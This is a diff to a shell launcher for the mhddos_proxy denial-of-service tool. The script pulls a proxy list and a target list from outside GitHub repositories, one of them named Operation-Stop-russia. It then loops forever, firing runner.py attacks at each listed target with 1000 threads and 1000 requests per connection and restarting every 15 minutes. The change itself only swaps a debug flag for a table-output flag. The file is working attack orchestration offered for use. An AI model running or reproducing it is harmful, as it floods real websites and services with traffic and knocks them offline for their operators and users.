@@ -6,7 +6,7 @@ python3 -m pip install -r requirements.txt
 
 threads="${1:-1000}"; threads="-t $threads"
 rpc="--rpc 1000"
-debug="--debug"
+debug="--table"
 proxy="--proxies https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/proxies/RURUproxies.txt"
 
 while true
@@ -21,7 +21,7 @@ do
    for (( i=1; i<=list_size; i++ ))
       do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst | cat | grep "^[^#]")")
-            python3 ~/mhddos_proxy/runner.py $proxy $cmd_line $threads $rpc $table&
+            python3 ~/mhddos_proxy/runner.py $proxy $cmd_line $threads $rpc $debug&
       done
 sleep 15m
 done
